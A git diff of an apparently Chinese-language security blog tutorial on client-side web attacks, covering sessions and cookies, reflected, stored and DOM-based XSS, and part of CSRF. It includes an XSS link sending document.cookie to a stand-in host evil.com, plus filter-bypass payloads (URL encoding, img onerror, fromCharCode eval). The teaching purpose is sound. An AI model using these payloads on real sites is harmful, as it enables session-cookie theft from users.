@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-uk" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Prerequisite 前提知识 要了解针对Web客户端的攻击，我们必须要先了解Session与Cookie的机制； HTTP协议在最初设计的时候是一个无状态（sta'><title>Client-side Attacks 针对客户端的Web攻击</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='写在前面 阅读本文，我们讲一起了解两种针对客户端的Web攻击： XSS CSRF 接着我们会跟着Mozilla的文档一起了解什么是同源策略，最后我们会一起来总'><title>Client-side Attacks 针对客户端的Web攻击</title>
 
 <link rel='canonical' href='https://ginkgo.org.cn/posts/client_side_attacks/'>
 
 <link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='Client-side Attacks 针对客户端的Web攻击'>
-<meta property='og:description' content='Prerequisite 前提知识 要了解针对Web客户端的攻击，我们必须要先了解Session与Cookie的机制； HTTP协议在最初设计的时候是一个无状态（sta'>
+<meta property='og:description' content='写在前面 阅读本文，我们讲一起了解两种针对客户端的Web攻击： XSS CSRF 接着我们会跟着Mozilla的文档一起了解什么是同源策略，最后我们会一起来总'>
 <meta property='og:url' content='https://ginkgo.org.cn/posts/client_side_attacks/'>
 <meta property='og:site_name' content='Under The Ginkgo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='xss' /><meta property='article:published_time' content='2022-05-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-01T22:30:39&#43;08:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='xss' /><meta property='article:tag' content='csrf' /><meta property='article:published_time' content='2022-05-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-03T11:13:02&#43;08:00'/>
 <meta name="twitter:title" content="Client-side Attacks 针对客户端的Web攻击">
-<meta name="twitter:description" content="Prerequisite 前提知识 要了解针对Web客户端的攻击，我们必须要先了解Session与Cookie的机制； HTTP协议在最初设计的时候是一个无状态（sta">
+<meta name="twitter:description" content="写在前面 阅读本文，我们讲一起了解两种针对客户端的Web攻击： XSS CSRF 接着我们会跟着Mozilla的文档一起了解什么是同源策略，最后我们会一起来总">
     <link rel="shortcut icon" href="/img/favicon.ico" />
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
@@ -218,8 +218,8 @@ if (!doNotTrack) {
     
     <header class="article-category">
         
-            <a href="/categories/ctf/" >
-                ctf
+            <a href="/categories/web_sec/" >
+                web_sec
             </a>
         
     </header>
@@ -261,7 +261,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    12 minute read
+                    13 minute read
                 </time>
             </div>
         
@@ -275,21 +275,33 @@ if (!doNotTrack) {
     <section class="article-content">
     
     
-    <h2 id="prerequisite-前提知识">Prerequisite 前提知识</h2>
-<p>要了解针对Web客户端的攻击，我们必须要先了解Session与Cookie的机制； <!-- raw HTML omitted --></p>
+    <h2 id="写在前面">写在前面</h2>
+<p>阅读本文，我们讲一起了解两种针对客户端的Web攻击： <!-- raw HTML omitted --></p>
+<ul>
+<li>XSS <!-- raw HTML omitted --></li>
+<li>CSRF <!-- raw HTML omitted --></li>
+</ul>
+<p>接着我们会跟着Mozilla的文档一起了解什么是同源策略，最后我们会一起来总结一下针对客户端的Web攻击的防御措施： <!-- raw HTML omitted --></p>
+<h2 id="prerequisite-前提知识">Prerequisite 前提知识</h2>
+<h3 id="session">Session</h3>
+<p>要了解针对Web客户端的攻击，我们必须要先了解 <strong>Session</strong> 与 <strong>Cookie</strong> 的机制； <!-- raw HTML omitted --></p>
+<blockquote>
+<p>我们为什么需要Session以及Cookie？ <!-- raw HTML omitted --></p>
+</blockquote>
 <p>HTTP协议在最初设计的时候是一个无状态（stateless）的协议，用户在浏览网页的时候发出请求，客户端只是返回页面的内容，不会保留任何关于本次请求的信息，即对用户一无所知。 <!-- raw HTML omitted --></p>
-<p>可是随着Web应用的发展，一些服务要求保存用户的状态，例如网购等就需要用户进行登录后访问自己的专属内容，那么实现状态（state）保存的方式就是 <code>Session</code> 会话，会话的双方就是服务器端以及浏览器的用户端。每次用户发起请求，向服务端请求关于其专属账号的内容的时候，都需要附带上自己专属的信息，比如 credential个人标识符, 添加在购物车的内容。 <!-- raw HTML omitted --></p>
+<p>可是随着Web应用的发展，一些服务需要 <strong>保存用户的状态</strong>,例如网购等就需要用户进行登录后访问自己的专属内容，那么实现状态（state）保存的方式就是 <code>Session</code> 会话：会话的双方就是服务器端以及浏览器的用户端； <!-- raw HTML omitted --></p>
+<p>每次用户发起请求，向服务端请求关于其专属账号的内容的时候，都需要附带上自己专属的信息，来告诉服务器返回其专属信息，比如 credential个人标识符, 添加在购物车的内容。 <!-- raw HTML omitted --></p>
 <p>保存这些内容的方式有： <!-- raw HTML omitted --></p>
 <ol>
 <li>
-<p>保存在本地html中的隐藏内容 (过时) <!-- raw HTML omitted --></p>
+<p>保存在本地html中的隐藏内容 (过时); <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">INPUT</span> <span class="na">TYPE</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">NAME</span><span class="o">=</span><span class="s">&#34;sessionid&#34;</span> <span class="na">VALUE</span><span class="o">=</span><span class="s">&#34;7456&#34;</span><span class="p">&gt;</span>
 </span></span></code></pre></div></li>
 <li>
-<p>Cookie (后面展开) <!-- raw HTML omitted --></p>
+<p>Cookie (后面展开); <!-- raw HTML omitted --></p>
 </li>
-</ol>
-<p>而向服务器端传递这些信息的手法 <!-- raw HTML omitted --></p>
+<li>
+<p>而向服务器端传递这些信息的手法有： <!-- raw HTML omitted --></p>
 <ol>
 <li>
 <p>URL <!-- raw HTML omitted -->
@@ -305,111 +317,149 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">...
 </span></span></code></pre></div></li>
 </ol>
-<p>慢慢的Cooike开始被广泛的使用，但是cookie有大小的限制（maximum size: 4096bytes）,无法存储太多的内容，那么我们为什么不在服务端来存储这些信息呢，这样也更安全，信息也可以更方便的被利用。 <!-- raw HTML omitted --></p>
-<p>那么又多了一个问题，就是服务端存储了这些内容，那么客户端告诉服务端自己需要的是哪一个session的内容呢？这些就需要服务端在开启一个session（例如用户登录的时候）的时候，返回给客户端一个 <code>sessionId</code> ，之后每次客户端发出HTTP请求的时候，都带上这个  <code>sessionId</code> ，服务端就知道了是谁要访问什么信息了，然后当用户登出的时候，就自动删除session的内容节省内存（历史信息存储到数据库中）。 <!-- raw HTML omitted --></p>
+</li>
+</ol>
+<p>慢慢的, <strong>Cooike</strong> 开始被广泛的使用，但是cookie有大小的限制（maximum size: 4096bytes）,无法存储太多的内容，那么我们为什么不在服务端来存储这些信息呢？这样也更安全，信息也可以更方便的被利用。 <!-- raw HTML omitted --></p>
+<p>那么又多了一个问题，就是服务端存储了这些内容，那么客户端告诉服务端自己需要的是哪一个session的内容呢？ <!-- raw HTML omitted --></p>
+<ol>
+<li>这些就需要服务端在开启一个session（例如用户登录的时候）的时候，返回给客户端一个 <code>sessionId</code> ; <!-- raw HTML omitted --></li>
+<li>之后每次客户端发出HTTP请求的时候，都带上这个 <code>sessionId</code>, 服务端就知道了是谁要访问什么信息了，然后当用户登出的时候，就自动删除session的内容节省内存（历史信息存储到数据库中）。 <!-- raw HTML omitted --></li>
+</ol>
 <p>通过以上我们可以稍微总结一下Session与Cookie的特点： <!-- raw HTML omitted --></p>
 <ul>
-<li>Session是存储在服务端的，由sessionId来唯一标识 <!-- raw HTML omitted --></li>
-<li>Cookie是由服务端产生后保存在客户端的简短信息，用在HTTP请求中向服务端展示所拥有的信息 <!-- raw HTML omitted --></li>
+<li>Session是存储在服务端的，由sessionId来唯一标识； <!-- raw HTML omitted --></li>
+<li>Cookie是由服务端产生后保存在客户端的简短信息，用在HTTP请求中向服务端展示所拥有的信息（包括 <strong>sessionId</strong> ； <!-- raw HTML omitted --></li>
 </ul>
 <h3 id="cookie">Cookie</h3>
-<p>接下来，我们再来展开讲讲Cookie的内容 <!-- raw HTML omitted --></p>
-<p>我们再来回顾一下，Cookie与Session最大的区别就是，Cookie是由 <code>服务器端创造</code> 的，存储在 <code>客户端</code> 的信息。是服务器要求客户端浏览器保存键值对的一种技术。客户端有了Cookie之后，每次请求都发送给服务器，同时每个cookie的大小不能超过4KB <!-- raw HTML omitted --></p>
-<p>如果我们用BurpSuite抓HTTP请求，我们就会发现很多请求都会带上Cookie的内容，这就是客户端通过向服务端展示自己所拥有的（来自服务端分配的）特定cookie，来减少认证的复杂度 <!-- raw HTML omitted --></p>
-<p><figure><img src="/ox-hugo/2022-05-19_10-45-46_screenshot.png" width="700px"/>
+<p>接下来，我们再来展开讲讲Cookie的内容： <!-- raw HTML omitted --></p>
+<p>我们再来回顾一下，Cookie与Session最大的区别就是: <!-- raw HTML omitted --></p>
+<ul>
+<li>Cookie是由 <code>服务器端创造</code> 的，存储在 <code>客户端</code> 的信息； <!-- raw HTML omitted --></li>
+<li>是服务器要求客户端浏览器保存键值对的一种技术； <!-- raw HTML omitted --></li>
+<li>客户端有了Cookie之后，每次请求都发送给服务器，同时每个cookie的大小不能超过4KB <!-- raw HTML omitted --></li>
+</ul>
+<p>如果我们用BurpSuite抓取HTTP请求，我们就会发现很多请求都会带上Cookie的内容，这就是 <strong>客户端</strong> 通过向 <strong>服务端</strong> 展示自己所拥有的（来自服务端分配的）特定cookie，来减少认证的复杂度； <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_10-45-46_screenshot.png"
+         alt="Figure 1: Server通过响应中的Set-Cookie来给客户端分配Cookie" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted -->Server通过响应中的Set-Cookie来给客户端分配Cookie</p>
+        </figcaption>
 </figure>
  <!-- raw HTML omitted --></p>
-<p>Cookie通过HTTP header向服务端进行传递，默认情况下是一对键值对，但也可以设置一些额外的信息来增加使用的灵活性 <!-- raw HTML omitted --></p>
-<p><figure><img src="/ox-hugo/2022-05-19_10-46-54_screenshot.png" width="700px"/>
+<p>Cookie通过HTTP header向服务端进行传递，默认情况下是一对键值对，但也可以设置一些额外的信息来增加使用的灵活性； <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_10-46-54_screenshot.png"
+         alt="Figure 2: Cookie以键值对的形式存储" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->Cookie以键值对的形式存储</p>
+        </figcaption>
 </figure>
  <!-- raw HTML omitted --></p>
-<p>我们可以利用浏览器来观察这些存储到浏览器本地的cookie <!-- raw HTML omitted --></p>
-<p><figure><img src="/ox-hugo/2022-05-19_10-50-18_screenshot.png" width="700px"/>
+<p>我们可以利用浏览器来观察这些存储到浏览器本地的cookie: <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_10-50-18_screenshot.png"
+         alt="Figure 3: 浏览器的Inspection功能" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->浏览器的Inspection功能</p>
+        </figcaption>
 </figure>
  <!-- raw HTML omitted --></p>
-<p>服务端则通过HTTP的回复来设置cookie的内容以及其他参数 <!-- raw HTML omitted --></p>
-<p><figure><img src="/ox-hugo/2022-05-19_10-51-35_screenshot.png" width="700px"/>
+<p>服务端则通过HTTP的回复来设置cookie的内容以及其他参数： <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_10-51-35_screenshot.png"
+         alt="Figure 4: HTTP响应中Set-Cookie的例子" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->HTTP响应中Set-Cookie的例子</p>
+        </figcaption>
 </figure>
  <!-- raw HTML omitted --></p>
 <h2 id="client-side-attacks-goals-针对客户端的攻击的目标">Client-side Attacks Goals 针对客户端的攻击的目标</h2>
+<p>下面这些就是针对客户端的攻击所想要达成的目的： <!-- raw HTML omitted --></p>
 <ol>
-<li>盗取Cookie <!-- raw HTML omitted --></li>
-<li>篡改登录表格 <!-- raw HTML omitted --></li>
-<li>执行额外的HTTP请求 <!-- raw HTML omitted --></li>
+<li>盗取Cookie; <!-- raw HTML omitted --></li>
+<li>篡改登录表格; <!-- raw HTML omitted --></li>
+<li>执行额外的HTTP请求; <!-- raw HTML omitted --></li>
 <li>以及任何用HTML以及Javascript做的任何事情！ <!-- raw HTML omitted --></li>
 </ol>
 <h2 id="xss">XSS</h2>
-<p>Cross-Site Scripting 跨站脚本攻击(简写为XSS主要是为了与CSS区分开) 的主要目标就是为了能够在目标页面上执行非法的脚本（JS）代码，“跨站”二字就体现在执行了本不应该出现在这个网站上的脚本代码。 <!-- raw HTML omitted --></p>
-<p>一般来说，造成的原因还是缺乏对于用户输入的检查，进而导致非法的HTML/JS代码注入到页面上，被浏览器解析之后，攻击者就是可以执行任意代码 <!-- raw HTML omitted --></p>
-<p>其具体表现往往就是通过精心设计的一个URL，通过社会工程学的方法诱导用户进行点击，URL中包含了将会植入到页面当中，被浏览器所解析执行的恶意代码。 <!-- raw HTML omitted --></p>
-<p>接着我们来看一看常见的三种XSS攻击 <!-- raw HTML omitted --></p>
+<p><strong>Cross-Site Scripting</strong> 跨站脚本攻击(简写为XSS主要是为了与CSS区分开)的主要目标就是： <!-- raw HTML omitted --></p>
+<ul>
+<li>为了能够在目标页面上执行非法的脚本（JS）代码， <!-- raw HTML omitted --></li>
+<li><strong>跨站</strong> 二字就体现在执行了本不应该出现在这个网站上的脚本代码。 <!-- raw HTML omitted --></li>
+</ul>
+<p>一般来说，造成的原因还是缺乏对于用户输入的检查，进而导致非法的HTML/JS代码注入到页面上，被浏览器解析之后，攻击者就是可以执行任意代码； <!-- raw HTML omitted --></p>
+<p>其具体表现往往就是通过精心设计的一个 <strong>URL</strong>, 通过社会工程学的方法诱导用户进行点击，URL中包含了将会植入到页面当中，被浏览器所解析进而执行恶意代码。 <!-- raw HTML omitted --></p>
+<p>接着我们来看一看常见的三种XSS攻击: <!-- raw HTML omitted --></p>
 <h3 id="reflected-xss-反射型xss">Reflected XSS 反射型XSS</h3>
-<p>&ldquo;反射&quot;意味着一个用户将不合法的输入先传给服务器，然后服务器再将不合法的javascript代码嵌入HTML中通过HTTP回复再反射给用户，进而浏览器解析执行这些恶意代码，从而造成危害，一般来说，黑客会通过社会工程学的手段来诱导用户点击一个包含恶意代码的链接。 <!-- raw HTML omitted --></p>
-<p>反射型XSS也被称为非持久化XSS，因为其要求用户点击恶意链接才能执行一次 <!-- raw HTML omitted --></p>
+<p>&ldquo;反射&quot;意味着： <!-- raw HTML omitted --></p>
+<ol>
+<li>一个用户将不合法的输入（例如一段js代码）先传给服务器; <!-- raw HTML omitted --></li>
+<li>然后服务器再将不合法的js代码（当作正常的内容）嵌入HTML后通过HTTP响应再反射给用户; <!-- raw HTML omitted --></li>
+<li>进而浏览器解析执行这些恶意的js代码，从而造成危害； <!-- raw HTML omitted --></li>
+</ol>
+<p>一般来说，黑客会通过社会工程学的手段来诱导用户点击一个包含恶意代码的链接。 <!-- raw HTML omitted --></p>
+<p><strong>反射型XSS</strong> 也被称为 <strong>非持久化XSS</strong>, 因为其要求用户点击恶意链接才能执行一次； <!-- raw HTML omitted --></p>
 <p>接下来我们来通过一个例子来说明反射型XSS是如何工作并造成损害的： <!-- raw HTML omitted --></p>
 <ol>
 <li>
-<p>服务器上有一个页面的叫做 <code>xss_test.php</code> ，其中有一段代码要求用户输入用户名，输入的用户名会返回到页面上 <!-- raw HTML omitted --></p>
+<p>服务器上有一个页面的叫做 <code>xss_test.php</code>, 其中有一段代码要求用户输入用户名，输入的用户名则会返回到页面上： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Welcome</span> <span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;inject&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div></li>
 <li>
-<p>用户点击了一条恶意修改的网页链接 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;script&gt;document.location= &#39;http://evil.com/log.php?&#39;+document.cookie&lt;/script&gt;
-</span></span></code></pre></div><p>我们可以看到这里inject参数被设置为了 <code>script</code> tag的代码来访问攻击者的域名并提供当前网页所拥有的cookie的值 <!-- raw HTML omitted --></p>
+<p>用户被诱导点击了一条恶意修改的网页链接（添加了js代码）； <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;script&gt;document.location=&#39;http://evil.com/log.php?&#39;+document.cookie&lt;/script&gt;
+</span></span></code></pre></div><p>我们可以看到这里 <code>inject</code> 参数被设置为了 <code>&lt;script&gt;</code> 标签所包含的代码来访问攻击者的域名并提供当前网页所拥有的cookie的值（ document.cookie）; <!-- raw HTML omitted --></p>
 </li>
 <li>
 <p>在用户点击之后，浏览器就会生成HTTP请求向服务器寻求资源，其中就包含了攻击者所包含的恶意代码 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /xss_test.php?inject=%3Cscript%3Edocument.location%3D%27ht tp%3A%2F%2Fevil%2Flog.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /xss_test.php?inject=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil%2Flog.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E 
 </span></span><span class="line"><span class="cl">Host: www.example.com 
 </span></span><span class="line"><span class="cl">...
 </span></span></code></pre></div></li>
 <li>
-<p>服务端的脚本通过将原本应该为用户名的内容拼接成html返回给用户，然后由浏览器自动解析执行，导致恶意代码被执行，用户的cookie被返回给了攻击者的网站，造成了泄露 <!-- raw HTML omitted --></p>
+<p>服务端的脚本通过将原本应该为用户名的内容拼接成HTML返回给用户，然后由浏览器自动解析执行，导致恶意代码被执行，用户的cookie被返回给了攻击者的网站，造成了cookie的泄露； <!-- raw HTML omitted --></p>
 </li>
 </ol>
-<p>开发者会利用各种办法来相办法来过滤这些恶意篡改的请求，用户也很容易发现异常的链接，但是攻击者仍然可以用模糊的手法来进行绕过 <!-- raw HTML omitted --></p>
-<p>例如： <!-- raw HTML omitted --></p>
+<p>开发者会利用各种办法来相办法来过滤这些恶意篡改的请求，用户也很容易发现异常的链接，但是攻击者仍然可以用模糊的手法来进行绕过，例如： <!-- raw HTML omitted --></p>
 <ul>
 <li>
 <p>Url encoding: <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%63%69%61%6F%27%29%3B%3C%2F%73%63%72%69%70%74%3E
 </span></span></code></pre></div></li>
 <li>
-<p>不使用 <code>&lt;script&gt;</code> tag： <!-- raw HTML omitted --></p>
+<p>不使用 <code>&lt;script&gt;</code> 标签的形式： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;img%20onerror=&#34;javascript:%20alert(document.cookie);&#34;%20src=asd&gt;
 </span></span></code></pre></div></li>
 <li>
-<p>动态执行（动态的构建恶意代码的内容） <!-- raw HTML omitted --></p>
+<p>动态执行（动态的构建恶意代码的内容）： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,99,105,97,111,39,41,59))&lt;/script&gt;
 </span></span></code></pre></div></li>
 </ul>
-<p>我们甚至可以将包含漏洞的链接通过短网址缩短或者转换为二维码来绕过检测 <!-- raw HTML omitted --></p>
+<p>我们甚至可以将包含漏洞的链接通过短网址缩短或者转换为二维码来绕过检测： <!-- raw HTML omitted --></p>
 <h3 id="stored-xss-存储型-xss">Stored XSS 存储型 XSS</h3>
-<p>存储型XSS顾名思义，恶意代码会先被攻击者存储在网页的服务端的数据库当中，当用户访问该网站时，存储的恶意代码会被服务端自动嵌入HTML中，然后由浏览器解析执行，造成危害。 <!-- raw HTML omitted --></p>
-<p>那么这种攻击一般就发生在用户可以获取其他用户进行的输入，常见的就有论坛或者留言板等内容。 <!-- raw HTML omitted --></p>
-<p>存储型XSS与反射型XSS最大的区别就是它是persistent持久的，并且所有能够获取恶意代码内容的用户都会收到影响，同时用户的防备更小，因为网页链接是正常的，而在正常加载中却出现了恶意代码的执行，可谓防不胜防。 <!-- raw HTML omitted --></p>
-<p>总结来说Stored XSS的执行分两步走 <!-- raw HTML omitted --></p>
-<ol>
-<li>Step1 <!-- raw HTML omitted -->
+<p>存储型XSS顾名思义，恶意代码会先被攻击者上传存储在网页的服务端的数据库当中，当用户访问该网站时，存储的恶意代码会被服务端自动嵌入HTML中，然后由用户本地的浏览器解析执行，造成危害。 <!-- raw HTML omitted --></p>
+<p>这种攻击一般就发生在用户可以获取其他用户进行的输入的地方，常见的就有论坛或者留言板等内容。 <!-- raw HTML omitted --></p>
+<p>存储型XSS与反射型XSS最大的区别： <!-- raw HTML omitted --></p>
 <ul>
-<li>攻击者上传还有恶意脚本代码的内容到服务器 <!-- raw HTML omitted --></li>
-<li>服务器长期存储这些恶意脚本代码（存储到数据库中） <!-- raw HTML omitted --></li>
+<li>就是它是 <strong>persistent</strong> 持久的，并且所有能够获取恶意代码内容的用户都会收到影响； <!-- raw HTML omitted --></li>
+<li>这种情况下同时用户的防备更小，因为网页链接是正常的，而在正常加载中却出现了恶意代码的执行，可谓防不胜防。 <!-- raw HTML omitted --></li>
+</ul>
+<p>总结来说Stored XSS的执行分两步走： <!-- raw HTML omitted --></p>
+<ul>
+<li>Step1: <!-- raw HTML omitted -->
+<ul>
+<li>攻击者上传还有恶意脚本代码的内容到服务器； <!-- raw HTML omitted --></li>
+<li>服务器长期存储这些恶意脚本代码（存储到数据库中）； <!-- raw HTML omitted --></li>
 </ul>
 </li>
 <li>Step2 <!-- raw HTML omitted -->
 <ul>
-<li>受害者访问这些有漏洞的网页 <!-- raw HTML omitted --></li>
-<li>服务器从数据库中取出恶意脚本代码嵌入返回给受害者的网页中 <!-- raw HTML omitted --></li>
-<li>继而浏览器自动解析和执行这些恶意脚本代码 <!-- raw HTML omitted --></li>
+<li>受害者访问这些有漏洞的网页； <!-- raw HTML omitted --></li>
+<li>服务器从数据库中取出恶意脚本代码嵌入返回给受害者的网页中； <!-- raw HTML omitted --></li>
+<li>继而浏览器自动解析和执行这些恶意脚本代码； <!-- raw HTML omitted --></li>
 </ul>
 </li>
-</ol>
+</ul>
 <h3 id="dom-based-xss">DOM-based XSS</h3>
 <p>在介绍DOM XSS之前，我们需要首先了解一下DOM是什么： <!-- raw HTML omitted --></p>
-<p>DOM(Document object model)文档对象模型，将网页当作一个文档，并用一种树状结构存储网页中的所有的标签，以及其他的信息，并提供了API供JS等脚本语言对页面内容进行查询与修改。我们可以通过浏览器的开发者工具来查看网页的DOM内容。 <!-- raw HTML omitted --></p>
-<p>我们可以看看JS代码调用DOM API的效果，此处的window/document元素就代表着整个网页文档， <!-- raw HTML omitted --></p>
+<p>DOM(Document object model)文档对象模型，将网页当作一个文档，并用一种树状结构存储网页中的所有的标签以及其他的信息，同时提供了API供JS等脚本语言对页面内容进行查询与修改。 <!-- raw HTML omitted --></p>
+<p>我们可以通过浏览器的开发者工具来查看网页的DOM内容。 <!-- raw HTML omitted --></p>
+<p>我们可以看看JS代码调用DOM API的效果，此处的window/document元素就代表着整个网页文档： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;window.alert(&#39;welcome to my home page!&#39;);&#34;</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>还可以为网页创建标签，写入内容等信息。 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>还可以为利用DOM API，通过js为网页创建标签，写入内容等信息： <!-- raw HTML omitted --></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
@@ -427,64 +477,95 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="err">/body&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/html&gt;</span>
-</span></span></code></pre></div><p>那么我们回到 DOM XSS，其与前面两种XSS的最大的区别就在于，攻击的过程完全只涉及客户端，而不依赖服务器端的返回。 <!-- raw HTML omitted --></p>
+</span></span></code></pre></div><p>现在我们回到 <strong>DOM XSS</strong>, 其与前面两种XSS的最大的区别就在于：攻击的过程完全只涉及客户端，而不依赖服务器端的返回。 <!-- raw HTML omitted --></p>
 <p>其步骤一般为： <!-- raw HTML omitted --></p>
 <ol>
-<li>攻击者构造一段含有一段直接篡改DOM结构的代码的链接然后发送给受害者 <!-- raw HTML omitted --></li>
-<li>受害者点击链接并向服务器请求网页 <!-- raw HTML omitted --></li>
-<li>服务器端收到请求，但是看不懂也无法执行篡改DOM结构的代码，直接将其与原本合法的网页返回给客户端 <!-- raw HTML omitted --></li>
-<li>客户端解析网页同时发现有修改DOM结构的代码，解析执行，造成危害 <!-- raw HTML omitted --></li>
+<li>攻击者利用DOM API构造一段含有一段直接篡改页面DOM结构的代码，然后嵌入链接中发送给受害者； <!-- raw HTML omitted --></li>
+<li>受害者点击链接并向服务器请求网页； <!-- raw HTML omitted --></li>
+<li>服务器端收到请求，但是看不懂也无法执行篡改DOM结构的代码，直接将其与原本合法的网页返回给客户端； <!-- raw HTML omitted --></li>
+<li>客户端解析网页同时发现有修改DOM结构的代码，解析执行，造成危害； <!-- raw HTML omitted --></li>
 </ol>
-<h3 id="xss的危害">XSS的危害</h3>
-<p>BeEF以及各类XSS平台都提供了自动脚本，只需要将组织好的脚本插入，就可以执行自己想要的操作 <!-- raw HTML omitted --></p>
-<p><figure><img src="/ox-hugo/2022-05-19_17-00-28_screenshot.png" width="700px"/>
+<h3 id="xss的工具">XSS的工具</h3>
+<p>BeEF以及各类XSS平台都提供了自动脚本，只需要将组织好的脚本插入，就可以执行自己想要的操作: <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_17-00-28_screenshot.png"
+         alt="Figure 5: BeEF" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 5: <!-- raw HTML omitted -->BeEF</p>
+        </figcaption>
 </figure>
  <!-- raw HTML omitted --></p>
-<p><figure><img src="/ox-hugo/2022-05-19_16-19-01_screenshot.png" width="700px"/>
+<p>各种XSS平台也可以提供很多功能： <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_16-19-01_screenshot.png"
+         alt="Figure 6: XSS平台" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 6: <!-- raw HTML omitted -->XSS平台</p>
+        </figcaption>
 </figure>
  <!-- raw HTML omitted --></p>
 <h2 id="csrf">CSRF</h2>
-<p>Cross-Site Request Forgery (CSRF, 读做 &ldquo;sea-surf&rdquo;)，其主要目标是利用用户已经登录的登录凭证（session cookie）来执行一系列越权的操作。 <!-- raw HTML omitted --></p>
+<p><strong>Cross-Site Request Forgery</strong> (CSRF, 读做 &ldquo;sea-surf&rdquo;)，其主要目标是利用用户已经登录的登录凭证（session, cookie）来执行一系列越权的操作。 <!-- raw HTML omitted --></p>
 <p>CSRF的主要执行流程为： <!-- raw HTML omitted --></p>
 <ol>
-<li>
-<p>受害者先登录存在漏洞的网站，并且保存session cookie的内容在本地，无需重复登录 <!-- raw HTML omitted --></p>
-</li>
-<li>
-<p>黑客向受害者发送一个恶意网站的链接（链接中只可以包含网址），受害者点击后请求该网页的资源 <!-- raw HTML omitted --></p>
-</li>
-<li>
-<p>这个网页中带有隐藏表格来自动发起POST请求，向存在漏洞的目标网站发送恶意操作的请求（例如修改账号密码） <!-- raw HTML omitted --></p>
-<p>此举能够成功是因为浏览器在发送请求的时候，会自动带上该域名下的所有本地存储的cookie，也就是相当于是本人发出的修改请求 <!-- raw HTML omitted --></p>
-<p>而用户本人可以对次完全不知情 <!-- raw HTML omitted --></p>
-</li>
